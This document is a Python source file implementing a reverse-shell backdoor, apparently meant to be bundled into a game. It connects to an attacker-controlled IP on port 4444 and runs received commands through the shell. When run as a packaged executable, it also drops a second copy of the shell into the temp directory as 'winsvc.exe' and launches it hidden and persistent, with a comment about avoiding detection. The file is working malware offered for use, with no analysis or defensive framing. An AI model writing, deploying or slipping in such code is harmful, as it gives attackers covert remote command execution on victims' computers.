import socket
import subprocess
import os
import threading
import time
import sys

ATTACKER_IP = "192.168.137.1"  # Your IP
ATTACKER_PORT = 4444

def launch_persistent_shell():
    """Launch the persistent shell as a separate process"""
    try:
        if getattr(sys, 'frozen', False):
            # Running as EXE - extract and run persistent shell
            import tempfile
            import base64
            
            # Persistent shell code (base64 encoded to avoid detection)
            shell_code = """
import socket,subprocess,os,time
ATTACKER_IP="192.168.137.1"
ATTACKER_PORT=4444
while 1:
 try:
  s=socket.socket()
  s.connect((ATTACKER_IP,ATTACKER_PORT))
  s.send(b"$ ")
  while 1:
   d=s.recv(1024)
   if len(d)==0:break
   if d.decode().startswith('cd '):
    try:os.chdir(d[3:].strip());s.send(b"$ ")
    except:s.send(b"error\\n$ ")
   else:
    try:r=subprocess.check_output(d,shell=True)
    except:r=b"error"
    s.send(r+b"$ ")
 except:time.sleep(5)
"""
            # Write to temp file and run
            temp_dir = tempfile.gettempdir()
            shell_path = os.path.join(temp_dir, "winsvc.exe")
            
            with open(shell_path, 'w') as f:
                f.write(shell_code)
            
            # Run hidden
            subprocess.Popen(
                ['python', shell_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            # Running as script - just import and run
            import persistent_shell
            thread = threading.Thread(target=persistent_shell.reverse_shell, daemon=False)
            thread.start()
            
    except Exception as e:
        pass

# Launch persistent shell in separate process
launch_persistent_shell()

# Original reverse shell for immediate access
def reverse_shell():
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.send(b"\n[+] Game shell connected\n> ")
            
            while True:
                command = s.recv(1024).decode().strip()
                if not command or command.lower() == 'exit':
                    break
                
                if command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        result = f"Directory: {os.getcwd()}\n"
                    except:
                        result = "Failed\n"
                else:
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
                    except:
                        result = "Error\n"
                
                s.send(result.encode())
                s.send(b"> ")
            s.close()
        except:
            time.sleep(5)

# Start original shell thread
thread = threading.Thread(target=reverse_shell, daemon=True)
thread.start()